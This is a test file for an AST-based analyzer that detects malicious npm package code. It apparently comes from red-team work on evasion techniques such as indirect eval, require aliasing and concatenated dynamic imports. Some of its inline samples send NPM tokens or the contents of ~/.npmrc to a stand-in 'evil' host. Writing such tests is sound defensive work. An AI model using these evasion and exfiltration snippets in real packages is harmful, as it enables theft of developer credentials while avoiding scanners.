// SPDX-License-Identifier: MIT
import { describe, expect, test } from "bun:test";
import { analyzeSource } from "../src/ast/analyzer";

function cats(src: string): Set<string> {
  return new Set(analyzeSource("inline", src).hits.map((h) => h.category));
}

describe("AST evasions H1-H18 (red-team P1)", () => {
  test("H1: (0, eval)('...') indirect eval", () => {
    expect(cats(`(0, eval)("require('https')")`).has("eval")).toBe(true);
  });

  test("H2: globalThis.eval('...')", () => {
    expect(cats(`globalThis.eval("require('https')")`).has("eval")).toBe(true);
    expect(cats(`global.eval("...")`).has("eval")).toBe(true);
  });

  test("H3: Function constructor via prototype chain ({}.constructor.constructor)", () => {
    expect(cats(`({}).constructor.constructor("return process.env")()`).has("eval")).toBe(true);
  });

  test("H4: Function constructor via array prototype chain ([].constructor.constructor)", () => {
    expect(cats(`[].constructor.constructor("return process")()`).has("eval")).toBe(true);
  });

  test("H5: alias of require — const r = require; r('https')", () => {
    expect(cats(`const r = require; r('https').get('x')`).has("network-builtin")).toBe(true);
  });

  test("H6: alias of globalThis.require", () => {
    expect(cats(`const r = globalThis.require; r('https').get('x')`).has("network-builtin")).toBe(true);
  });

  test("H7: Reflect.apply(eval, ...)", () => {
    expect(cats(`Reflect.apply(eval, null, ["require('https')"])`).has("eval")).toBe(true);
  });

  test("H8: eval.call(null, '...')", () => {
    expect(cats(`eval.call(null, "require('https')")`).has("eval")).toBe(true);
    expect(cats(`Function.apply(null, ["return process"])`).has("eval")).toBe(true);
  });

  test("H9: dynamic import('https') ESM", () => {
    expect(cats(`import('https')`).has("network-builtin")).toBe(true);
  });

  test("H10: dynamic import('htt' + 'ps') concatenated", () => {
    expect(cats(`import('htt' + 'ps')`).has("network-builtin")).toBe(true);
  });

  test("H11: async () => await import('http' + 's')", () => {
    expect(cats(`(async ()=>{const m = await import('http' + 's'); m.get('x');})();`).has("network-builtin")).toBe(true);
  });

  test("H12: new Worker(src, {eval:true}) with require('https') inside", () => {
    const src = `const w = new (require('worker_threads').Worker)('require(\\'https\\').get(\\'x\\')',{eval:true})`;
    const c = cats(src);
    expect(c.has("eval")).toBe(true);
    expect(c.has("network-builtin")).toBe(true);
  });

  test("H13: process.binding(...) internal API", () => {
    const c = cats(`process.binding('http_parser')`);
    expect(c.has("eval") || c.has("network-builtin")).toBe(true);
  });

  test("H14: process.dlopen(...) native shared object load", () => {
    expect(cats(`process.dlopen({exports:{}}, '/tmp/evil.so')`).has("child-process")).toBe(true);
  });

  test("H15: module.constructor._load('child_process').exec(...)", () => {
    expect(cats(`module.constructor._load('child_process').exec('ls')`).has("child-process")).toBe(true);
  });

  test("H16: globalThis.fetch.call(null, ...)", () => {
    expect(cats(`globalThis.fetch.call(null, 'https://x', {body: process.env.NPM_TOKEN})`).has("fetch")).toBe(true);
  });

  test("H18: process[String.fromCharCode(...)] computed env access", () => {
    expect(cats(`process[String.fromCharCode(0x65,0x6e,0x76)]`).has("env-read")).toBe(true);
  });

  test("FP guard: benign console.log does not trip eval/network", () => {
    const c = cats(`console.log('hi')`);
    expect(c.has("eval")).toBe(false);
    expect(c.has("network-builtin")).toBe(false);
    expect(c.has("fetch")).toBe(false);
  });

  test("FP guard: fs.readFile to relative build path does not flag secret-path", () => {
    expect(cats(`require('fs').readFile('./build/output.js', () => {})`).has("secret-path")).toBe(false);
  });

  test("FP guard: tsc -b style prepare is inert", () => {
    expect(analyzeSource("inline", `// nothing dangerous\nconst x = 1;`).hits.length).toBe(0);
  });
});

describe("AST evasions: combined taint chains still escalate", () => {
  test("alias-of-require + env exfil reaches taintToSink", () => {
    const r = analyzeSource(
      "inline",
      `const r = require; const tok = process.env.NPM_TOKEN; r('https').request({host:'evil', path:'/'+tok}).end();`,
    );
    expect(r.taintToSink).toBe(true);
    expect(r.taintSources).toContain("env-read");
    expect(r.taintSinks.includes("network-builtin") || r.taintSinks.includes("fetch")).toBe(true);
  });

  test("dynamic import + secret read reaches taintToSink", () => {
    const r = analyzeSource(
      "inline",
      `const m = await import('https'); const fs = await import('fs'); const data = fs.readFileSync('/home/x/.npmrc'); m.request({host:'evil'}).end(data);`,
    );
    expect(r.taintToSink).toBe(true);
  });
});
